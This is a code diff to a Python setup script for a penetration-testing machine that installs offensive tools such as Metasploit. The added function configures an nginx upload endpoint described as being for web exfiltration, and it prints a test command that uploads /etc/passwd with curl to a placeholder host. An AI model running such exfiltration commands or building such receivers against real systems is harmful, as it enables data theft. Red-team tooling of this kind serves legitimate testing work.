@@ -13,6 +13,7 @@ APT_PACKAGES = [
 	'golang-go',
 	'jxplorer',
 	'metasploit-framework',
+	'nginx',
 	'remmina',
 	'seclists',
 	'smbmap',
@@ -68,6 +69,21 @@ PYPI_PACKAGES = [
 
 # ---- Begin Function declarations -----
 
+def nginx_config():
+	# Used to create an NGINX proxy for apache for web exfiltration 
+	os.system("sudo mkdir -p /var/www/uploads/Exfil")
+	os.system("sudo chown -R www-data:www-data /var/www/uploads/Exfil")
+	if os.path.exists('/etc/nginx/sites-available/'):
+		os.system("sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf")
+		os.system("sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/")
+		os.system("sudo systemctl restart nginx.service")
+		os.system("sudo rm /etc/nginx/sites-enabled/default")
+		print(colored("NGINX has been setup. To test the upload, try:\n","green"))
+		print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/upload/Exfil/testfile.txt", "green"))
+	else:
+		print(colored("Error with nginx proxy setup", "red"))
+
+
 def env_setup():
 	""" This is meant to start services, check running processes, etc """
 	print(colored("Starting SSH service ...", "blue"))
@@ -96,6 +112,8 @@ def msfdb_init():
 	os.system('systemctl status postgresql')
 	os.system('sudo msfdb init')
 	print("MSF Database Initialized")
+	print("Creating msfconsole.rc file")
+	os.system(f' cp ./msfconsole.rc /home/{user}/.ms4/msfconsole.rc')
 
 #Consider moving into environment setup
 def neo4j_init():
@@ -220,6 +238,7 @@ def terminal_selection():
 	# Choice menu
 	if menu_entry_index == 0:
 		print(("Match Successful on ALL"))
+		nginx_config()
 		system_update()
 		msfdb_init()
 		neo4j_init()
@@ -227,6 +246,7 @@ def terminal_selection():
 	elif menu_entry_index == 1:
 		print("Match successful on TOOLS")
 		#software_update()
+		nginx_config()
 		tool_install()
 		tool_update()
 		msfdb_init()
